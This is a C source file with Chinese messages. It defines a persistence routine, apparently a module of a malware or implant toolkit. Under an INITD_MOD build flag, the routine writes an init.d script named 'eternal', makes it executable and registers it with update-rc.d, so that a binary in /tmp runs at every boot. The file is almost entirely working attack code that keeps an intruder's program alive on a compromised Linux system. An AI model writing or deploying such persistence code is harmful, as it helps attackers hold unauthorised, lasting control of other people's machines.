#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "info.h"

#ifdef INITD_MOD
void setup_initd_persistence() {
    printf("设置init.d持久化...\n");
    const char* initd_path = "/etc/init.d/eternal";
    FILE *initd_file = fopen(initd_path, "w");
    if (initd_file) {
        fprintf(initd_file, "#!/bin/sh\n");
        fprintf(initd_file, "### BEGIN INIT INFO\n");
        fprintf(initd_file, "# Provides:          eternal\n");
        fprintf(initd_file, "# Required-Start:    $remote_fs $syslog\n");
        fprintf(initd_file, "# Required-Stop:     $remote_fs $syslog\n");
        fprintf(initd_file, "# Default-Start:     2 3 4 5\n");
        fprintf(initd_file, "# Default-Stop:      0 1 6\n");
        fprintf(initd_file, "# Short-Description: Start daemon at boot time\n");
        fprintf(initd_file, "# Description:       Enable service provided by daemon.\n");
        fprintf(initd_file, "### END INIT INFO\n\n");
        fprintf(initd_file, "case \"$1\" in\n");
        fprintf(initd_file, "  start)\n");
        fprintf(initd_file, "    echo \"Starting eternal\"\n");
        fprintf(initd_file, "    /tmp/eternal &\n");
        fprintf(initd_file, "    ;;\n");
        fprintf(initd_file, "  stop)\n");
        fprintf(initd_file, "    echo \"Stopping eternal\"\n");
        fprintf(initd_file, "    killall eternal\n");
        fprintf(initd_file, "    ;;\n");
        fprintf(initd_file, "  *)\n");
        fprintf(initd_file, "    echo \"Usage: /etc/init.d/eternal {start|stop}\"\n");
        fprintf(initd_file, "    exit 1\n");
        fprintf(initd_file, "    ;;\n");
        fprintf(initd_file, "esac\n\n");
        fprintf(initd_file, "exit 0\n");
        fclose(initd_file);
        chmod(initd_path, 0755); // 确保脚本可执行
        system("update-rc.d eternal defaults"); // 注册启动脚本
        printf("持久化命令已添加到init.d。\n");
    } else {
        perror("无法创建init.d脚本文件");
    }
}
#endif